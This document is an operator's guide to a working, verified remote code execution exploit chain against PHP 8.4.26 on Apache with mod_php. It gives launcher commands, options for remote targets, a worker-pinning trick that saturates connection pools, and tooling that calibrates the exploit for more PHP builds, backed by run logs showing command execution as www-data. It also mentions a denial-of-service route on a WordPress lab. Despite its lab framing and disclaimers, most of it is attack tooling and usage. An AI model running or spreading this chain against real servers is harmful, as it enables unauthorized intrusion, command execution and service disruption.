# PHP2Shell RCE — verified exploit and how to use it

Date: 2026-10-21. Scope: authorized testing only.

## 1. What is verified

A full, pure-HTTP RCE chain for **PHP 8.4.26 + Apache prefork + mod_php** has
been executed against a local laboratory target. No agent, file drop, gdb or
debugger is needed on the target: the exploit is a normal HTTP client.

Verified output, 3/3 runs:

```text
[+] chunk base = 0x7ffffc400000
[+] libphp base = 0x7ffffe013000
[*] stage 3: HTDATA=0x7ffffc4690d8 ZIF=0x7ffffe478370
[+] W3 attempt 1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The chain:

```text
stage 1  Set-Cookie out-of-bounds read   -> Zend MM 2 MB chunk base
stage 2  Set-Cookie out-of-bounds read   -> libphp base (zval_ptr_dtor)
stage 3  upload_progress fake reference  -> pDestructor = zif_system
```

The exploit itself is the public research tool by **9bie**
(<https://github.com/9bie/php2shell-bypass-aslr-exp>). `php2shell_rce.py` is a
thin launcher: it runs the bootstrapped upstream checkout, reads the
`zif_system` / `zval_ptr_dtor` offsets from the corresponding `libphp.so`, and
runs all three stages.

## 2. Target requirements

| Setting | Required value |
| --- | --- |
| PHP | 8.4.26 (fixed in 8.4.27; other branches have their own patch) |
| SAPI | Apache prefork + `mod_php`, **one worker** |
| `display_errors` | `On` (the heap leak uses a request-startup warning) |
| `memory_limit` | 8M or higher; the OOM field is sized as `memory_limit + 12M` |
| `max_input_vars` | `1000` |
| `session.upload_progress.enabled` | `On` |
| `session.use_cookies` | `1` |
| `session.use_strict_mode` | `0` |

The target page does **not** need `session_start()`: session initialization
happens in the multipart callback before RINIT.

These are laboratory conditions. A default production PHP (128M,
`display_errors=Off`, several workers) will not match the hard-coded heap
calibration; see section 5.

### 2.1 The profile is not tied to 8M

Verified on PHP 8.4.26: the same offsets and heap calibration work at **8M and
128M**. Only the OOM field changes:

```text
memory_limit=8M    -> huge_mb=12   (upstream default)
memory_limit=128M  -> huge_mb=140  (limit + 12)
```

The dispatcher can also discover it: with no limit supplied it tries
8, 16, 32, 64, 128, 256 and 512M, stopping at the first proof. Verified on the
128M replica — the first four limits fail, 128M succeeds:

```text
[*] trying memory_limit=8M (huge_mb=20)
[-] memory_limit=8M did not succeed
...
[*] trying memory_limit=128M (huge_mb=140)
[+] chain succeeded with memory_limit=128M
PROOF: uid=33(www-data) ...
```

The limit can still be supplied explicitly:

```sh
python3 tools/php2shell_auto.py -u http://127.0.0.1:8094/index.php \
    -c 'id>/out/p1' --memory-limit-mb 128 \
    --repo-dir /tmp/php2shell-rce --proof-file /tmp/p2s-128/out/p1
```

Verified output:

```text
[*] memory_limit=128M -> huge_mb=140
[+] chunk base = 0x7ffffc400000
[+] libphp base = 0x7ffffe013000
[+] W3 attempt 1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Constraints: `post_max_size` and any proxy body limit must allow `huge_mb`;
`display_errors=On` and a single prefork worker are still required. The heap
calibration did not change between 8M and 128M on this build.

### 2.1 Commands and interactive mode

The command is embedded in a 167-byte fake `zend_string`: on a remote target
`-c` allows at most 14 bytes. On a local lab `-c` is staged automatically in
`/out/c`, so any length works and the output is captured. For longer commands
or a REPL:

```sh
# local lab: stage a script in /out/c and run it
python3 tools/php2shell_auto.py -u http://127.0.0.1:8105/index.php \
    --script ./cmd.sh --container p2s-lab-8426 --memory-limit-mb 8

# interactive REPL (one full chain run per command, ~1 min)
python3 tools/php2shell_auto.py -u http://127.0.0.1:8105/index.php \
    --interactive --container p2s-lab-8426 --memory-limit-mb 8
```

`--script` wraps the file in `{ ... ; } > /out/o 2>&1`, writes it to `/out/c`
and sends `sh</out/c` (8 bytes). The interactive loop does the same per line and
prints `/out/o`. Both need a local `/out` mount; remote targets accept short
commands only unless a separate upload channel exists.

### 2.2 Speed

The dispatcher probes the target `memory_limit` with one POST and reads the
fatal message (`Allowed memory size of N bytes`), instead of running the whole
chain at every limit. Measured: 8M target 7.0 s, 128M target 13.5 s. If the
probe is inconclusive it falls back to the sweep. Additional switches:

```sh
--memory-limit-mb 128   # skip the probe
--retries 1             # fewer attempts (stage 3 uses retries+2)
--no-pre-rotate         # skip the initial rotation
--no-retry-rotate       # no rotation between failures
```

### 2.3 Multi-worker targets

The session state is per worker. With several prefork children, A and B can
land on different processes:

```text
stage 1 attempt: heap leak missed   (no pinning, 2 workers)
```

`--pin-workers N` holds N-1 workers with idle keep-alive connections, leaving
one for the chain. For loopback targets `auto` reads the count from the local
container. For remote targets pinning is opt-in: `auto` cannot count workers, so it
saturates the pool with keep-alive connections until a request stops being
answered, then releases one connection. Only use it on authorized
infrastructure. `--pin-max N` bounds the
connections (default 32); `--no-pin-workers` disables pinning.
Verified on 2 and 4 workers (`uid=33(www-data)`). The server needs
`KeepAlive On`; the lab configs `apache-2w.conf` / `apache-4w.conf` use a
300-second timeout.

### 2.4 Proof handling (no manual --fetch)

`--fetch /p1` is no longer required in the common case:

| Target | Command | Proof |
| --- | --- | --- |
| Local lab | `id>/out/p1` (default) | reads the container's `/out` mount, detected with `docker inspect` |
| Remote | `id>p1` (default) | fetches `/p1` automatically |
| Remote, absolute output (`id>/tmp/p1`) | no auto fetch | blind execution; use a callback or a web-accessible path |
| Any | `--fetch /path` | explicit override |
| Any | `--no-fetch` | disable the automatic fetch |

For a local lab started with `tools/php2shell_labs.py`, pass
`--container p2s-lab-<version>` or `--proof-file lab/rce/out/<version>/p1` so
the dispatcher reads the right mount.

## 3. Usage

### 3.1 Local laboratory (recommended first)

```bash
# 1. Start the PHP 8.4.26 target (upstream lab)
git clone --depth 1 https://github.com/9bie/php2shell-bypass-aslr-exp
cd php2shell-bypass-aslr-exp
docker compose -f docker/docker-compose.yml up -d
curl -s http://127.0.0.1:8088/index.php          # OK

# 2. Run the launcher (English interface)
cd /Users/dpua/Downloads/php-vuln
python3 tools/php2shell_rce.py \
    -u http://127.0.0.1:8088/index.php \
    -c 'id>/out/p1' \
    --proof-file /tmp/php2shell-rce/out/p1
```

The launcher does not clone the upstream. Run
`python3 tools/bootstrap_upstream.py` first (it pins the commit) or pass
`--repo-dir` to an existing checkout; the launcher then applies the documented
runtime changes in place. The launcher runs `docker/offsets.py` against
the `php2shell-target` container to obtain the libphp offsets; use
`--container <name>` if your container has another name.

### 3.2 Remote target

For a remote host the launcher cannot read `libphp.so`. Provide the offsets of
that exact build:

```bash
# On a matching build (same PHP package/image):
nm -D /usr/lib/apache2/modules/libphp.so | grep -E ' (zif_system|zval_ptr_dtor)$'

python3 tools/php2shell_rce.py \
    -u https://lab.example/index.php \
    -c 'id>/tmp/p1' \
    --zif-offset 0x465370 --dtor-offset 0x65eb60 \
    --allow-remote
```

`--allow-remote` exists so the tool cannot be pointed at a non-loopback host by
accident. Use it only with written authorization.

## 4. Result on the WordPress 8.3.33 laboratory (127.0.0.1:8080)

The WordPress target runs **PHP 8.3.33** (affected: fixed in 8.3.36) with Apache
prefork + mod_php, `memory_limit=128M`.

- Pre-RINIT OOM confirmed: `Allowed memory size of 134217728 bytes exhausted
  ... in Unknown on line 0`, worker survives.
- Stage 1 (heap leak) was ported to this build: a 4096-byte `Set-Cookie` leak
  gives the Zend MM chunk base (e.g. `0xffffae200000`), and stage 2 gives the
  libphp base (e.g. `0xffffb0300000`).
- Stage 3 (fake HashTable / `zif_system`) is **not calibrated** for this build.
  Measured state after the stage-3 "A" request on 8.3.33:

  ```text
  PS(http_session_vars) = chunk + 0x56180   (dangling reference)
  55-byte ref buffers land at chunk + 0x5d068 + n*0xa0
  ```

  The public profile assumes the dangling reference sits at `chunk + 0x24e0`
  and places the fake reference there; on 8.3.33 that offset is different, so
  the request dies with SIGSEGV before `zif_system` runs. **No RCE is claimed
  on PHP 8.3.33.** Calibrating the pads / reference placement is the remaining
  research task.

So the WordPress lab is confirmed as *exposed* and *DoS-able* through the
pre-RINIT OOM, but the RCE proof in this repository is for PHP 8.4.26.

## 5. Why produced servers may still fail

1. **Version.** 8.4.27 / 8.3.36 / 8.2.35 / 8.5.12 fix the issue. Check the
   version that actually serves requests, not the CLI or an image tag.
2. **memory_limit.** The OOM stage is sized for 8M. At 128M the same request
   needs a different size and a different heap calibration.
3. **display_errors.** The heap leak relies on a request-startup warning being
   written before the headers are committed. With `display_errors=Off` the
   shipped chain does not leak (a separate leak path exists in the upstream
   research, but it is not implemented here).
4. **Workers.** The chain assumes one prefork worker. With several workers the
   requests must be pinned or the pool reduced.
5. **Offsets.** `zif_system` and `zval_ptr_dtor` are per-build. Always extract
   them from the target's own `libphp.so`.

## 6. Cleanup

```bash
docker rm -f php2shell-target
```

Remove any proof files written by the command. The exploit does not install
persistence, but the executed command may have created files.

## 7. Attribution and authorized use

- Exploit: 9bie, `php2shell-bypass-aslr-exp` (public research repository).
- Vulnerability analysis: Wiz, Calif, PHP Foundation and the PHP security
  advisories referenced in `docs/php2shell-analysis.md`.
- The launcher in this directory only orchestrates the upstream exploit.

This material is for systems you own or have explicit written permission to
test. Testing third-party infrastructure without authorization is illegal in
most jurisdictions.

## 8. Version-aware dispatch (`tools/php2shell_auto.py`)

The chain is build-specific, so the dispatcher does not guess. It fingerprints
the target, rejects fixed releases, compares the OS in the `Server` header
(Debian/Ubuntu/Fedora/Alpine…) with the profile, and looks up a **verified build
profile**. A distro mismatch stops before any request; `--force-build` overrides
only when the libphp binary is known to match:

```bash
python3 tools/php2shell_auto.py --list
python3 tools/php2shell_auto.py -u http://127.0.0.1:8088/index.php \
    -c 'id>/out/p1' \
    --repo-dir /tmp/php2shell-rce \
    --proof-file /tmp/php2shell-rce/out/p1
```

Result on the 8.4.26 lab: `PROOF: uid=33(www-data)`. Result on the 8.3.33
WordPress: the profile exists but `rce=false`, so the dispatcher refuses to run
the RCE stage and prints what is still missing.

### Profile schema (`profiles/<version>-<distro>.json`)

Apache/mod_php profile:

```json
{
  "name": "php-8.4.26-bookworm-amd64",
  "php_version": "8.4.26",
  "branch": "8.4",
  "fixed_in": "8.4.27",
  "sapi": "apache",
  "verified": true,
  "rce": true,
  "libphp": { "zif_system": "0x465370", "zval_ptr_dtor": "0x65eb60", "htdata": "0x690d8" },
  "stages": {
    "stage1_n": 841, "stage1_forge_len": 79,
    "stage2_t": 406, "stage2_v": 16,
    "stage3_pads": [[31,31],[31,31],[31,31],[31,31],[31,31],[31,31]],
    "stage3_carrier": true
  },
  "oom_mb": 12
}
```

FPM profile (no heap-leak stages; the `fpm` block carries the
`BG(unserialize)` offsets — see [fpm-chain.md](fpm-chain.md)):

```json
{
  "name": "php-8.4.26-fpm",
  "php_version": "8.4.26",
  "branch": "8.4",
  "fixed_in": "8.4.27",
  "sapi": "fpm",
  "rce": true,
  "libphp": { "zif_system": "0x386660", "zval_ptr_dtor": "0x54a0d0", "htdata": null },
  "fpm": {
    "basic_globals": "0xa04660",
    "bg_unserialize_data_off": 872,
    "bg_unserialize_level_off": 880,
    "struct_size": 8216,
    "reclaim_pads": [4096, 4096, 4096],
    "reclaim_size": 12288
  },
  "stages": {},
  "oom_mb": 4
}
```

The full machine-checked schema is `profiles/schema.json`; validate with
`make validate-profiles`. `rce` must stay `false` until the chain has
executed a command on a replica of that exact build. Same PHP version built
by another distribution has different offsets, so the version string alone is
not a build fingerprint.

### Scaling to more versions

1. **Stage 1 (heap leak)** can be discovered at runtime: send unique 48-byte
   values, read which one appears in the `Set-Cookie`, and use that index for the
   forge. This removes part of the per-build calibration.
2. **Stage 2 (libphp leak)** can be swept over the target-array index until the
   cookie yields a page-aligned `pDestructor`.
3. **Stage 3 (fake HashTable / `zif_system`)** is the hard part: the dangling
   reference address and the live 167-byte carrier must be measured for each
   build. A calibration harness on a local replica (with `/proc/<pid>/mem` or
   ASAN) turns that measurement into a profile.
4. **Fixed releases** are rejected before any request is sent; `display_errors`,
   `memory_limit`, worker count and session settings must match the profile.

## 9. Profile generator and vulnerable-version catalog

Three pieces work together:

| File | Role |
| --- | --- |
| `catalog/vulnerable.json` | Every branch in the advisory matrix (5.4 → 8.5, plus 8.6 RC), with the affected range and fixed release. |
| `tools/php2shell_calibrate.py` | Turns a local replica of one build into a verified JSON profile. |
| `tools/php2shell_auto.py` | Fingerprints the target, checks the catalog, loads the matching profile, and refuses to guess. |

### Generating a profile

```bash
python3 tools/php2shell_calibrate.py \
    --target http://127.0.0.1:8088/index.php \
    --container php2shell-target \
    --repo-dir /tmp/php2shell-rce \
    --proof-file /tmp/php2shell-rce/out/p1 \
    --distro bookworm
```

The generator:

1. fingerprints the target and reads `memory_limit` / `display_errors` / worker
   count from the container (the web SAPI is confirmed by the stage-1 leak),
2. extracts `zif_system` and `zval_ptr_dtor` from the container's `libphp.so`,
3. discovers the stage-1 parameters at runtime (unique 48-byte values reveal
   which allocation reclaimed the stale block; the forge length is then tested),
4. sweeps the stage-2 array index until a page-aligned `pDestructor` appears,
5. tries the known stage-3 layouts and executes a command; only a real proof
   file sets `rce: true`,
6. writes `profiles/<version>-<distro>.json`.

Verified run on the 8.4.26 lab:

```text
[*] stage1 probe: stale block taken by v0841
    N=841 len=63 -> cookie=4096 chunk=0x7ffffc400000
[*] stage2 T=406 -> libphp=0x7ffffe013000
[+] stage3 0x690d8/bookworm: uid=33(www-data) ...
[*] wrote profiles/8.4.26-bookworm.json
[*] rce=True
```

### Coverage vs exploitability

The catalog covers **all vulnerable branches**, but a version is exploitable
only when a **verified profile for that exact build** exists. The generator does
not fabricate offsets: a build that was never calibrated is reported as
"vulnerable, no profile", and the dispatcher stops.

Current coverage:

- PHP 8.4.26 / bookworm image — RCE verified.
- PHP 8.3.33 / WordPress image — stage 1 and 2 leaked, stage 3 not calibrated.
- Everything else — catalog entry only; run the generator against a replica of
  that build to add it.

### Adding many builds

For each target build: start a replica with the lab config (single worker,
`display_errors=On`, `memory_limit=8M`), run the generator, commit the JSON.
The dispatcher then matches by exact version and, when available, by the libphp
build fingerprint. This is the only honest way to scale to "any version": one
calibration per binary, no guessed offsets.

## 10. Profile factory (`tools/php2shell_matrix.py`)

The factory turns the calibrator into a repeatable pipeline over the vulnerable
matrix:

```bash
python3 tools/php2shell_matrix.py --repo-dir /tmp/php2shell-rce
python3 tools/php2shell_matrix.py --only 8.3.35 --repo-dir /tmp/php2shell-rce
python3 tools/php2shell_matrix.py --full-search          # no stage-2 hint (slow)
```

For each build it starts a disposable replica from `lab/rce/` (single worker,
`display_errors=On`, `memory_limit=8M`, `/out` mounted), runs the calibrator,
writes `profiles/<version>-bookworm-<arch>.json`, removes the container, and
prints a coverage table plus `profiles/matrix_report.json`.

Verified factory run on PHP 8.4.26:

```text
=== 8.4.26-bookworm-aarch64 (php:8.4.26-apache) ===
[*] stage1 probe: stale block taken by v0841
    N=841 len=63 -> cookie=4096 chunk=0x7ffffc400000
[*] stage2 T=406 -> libphp=0x7ffffe013000
[+] stage3 0x690d8/bookworm: uid=33(www-data) ...
[*] wrote profiles/8.4.26-bookworm-aarch64.json
[*] rce=True
```

A build that only yields the leaks is stored with `rce=false`; the dispatcher
will not pretend otherwise.

### Build matrix defaults

| Key | Image | Port |
| --- | --- | --- |
| 8.2.34 | `php:8.2.34-apache` | 8090 |
| 8.3.35 | `php:8.3.35-apache` | 8091 |
| 8.4.26 | `php:8.4.26-apache` | 8092 |
| 8.5.11 | `php:8.5.11-apache` | 8093 |

Add a build by appending an entry to `BUILDS` in `tools/php2shell_matrix.py` and
running the factory. Profiles are architecture-specific (`aarch64` vs
`x86_64`), because the heap layout and the libphp offsets differ.

### Honest limit: arbitrary read

The stage-1 primitive is a **linear heap read**, not an arbitrary read: PS(id)
is a `zend_string *` whose data is inline at `str+0x18`, so the start address is
fixed to the reclaimed block. Pointing it at `libphp.so` would require
overwriting `ps_globals.id` itself, i.e. the same write primitive the stage-3
chain lacks. Therefore remote build fingerprinting through this leak is not
available; the practical route is the profile database plus per-build
calibration.
